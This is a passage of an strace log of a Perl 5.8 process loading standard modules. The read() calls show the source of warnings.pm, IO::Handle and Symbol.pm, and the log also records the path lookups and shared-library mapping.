\'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
11347 07:37:14.575457 brk(0x81b6000)    = 0x81b6000
11347 07:37:14.575474 brk(0x81b5000)    = 0x81b5000
11347 07:37:14.575554 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
11347 07:37:14.575982 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
11347 07:37:14.576696 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
11347 07:37:14.576837 read(8, "", 4096) = 0
11347 07:37:14.576878 close(8)          = 0
11347 07:37:14.577046 _llseek(6, 412, [412], SEEK_SET) = 0
11347 07:37:14.577062 _llseek(6, 0, [412], SEEK_CUR) = 0
11347 07:37:14.577072 close(6)          = 0
11347 07:37:14.577114 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
11347 07:37:14.577137 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11347 07:37:14.577165 futex(0xb7fc3070, 0x81 /* FUTEX_??? */, 2147483647) = 0
11347 07:37:14.577180 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
11347 07:37:14.577194 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11347 07:37:14.577288 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
11347 07:37:14.577314 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7fc7000
11347 07:37:14.577337 mmap2(0xb7fcb000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fcb000
11347 07:37:14.577353 close(6)          = 0
11347 07:37:14.577481 stat64("/etc/perl/IO/Handle.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577497 stat64("/etc/perl/IO/Handle.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577511 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577524 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577538 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577551 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577566 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577578 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577591 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577603 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577616 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.577629 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
11347 07:37:14.577650 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.577665 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.577676 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.577693 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
11347 07:37:14.578098 stat64("/etc/perl/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578115 stat64("/etc/perl/Symbol.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578128 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578141 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578155 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578168 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578182 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578194 stat64("/usr/lib/perl5/Symbol.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578207 stat64("/usr/share/perl5/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578220 stat64("/usr/share/perl5/Symbol.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578273 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578331 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578345 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.578358 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
11347 07:37:14.578379 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.578394 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.578405 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.578423 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n   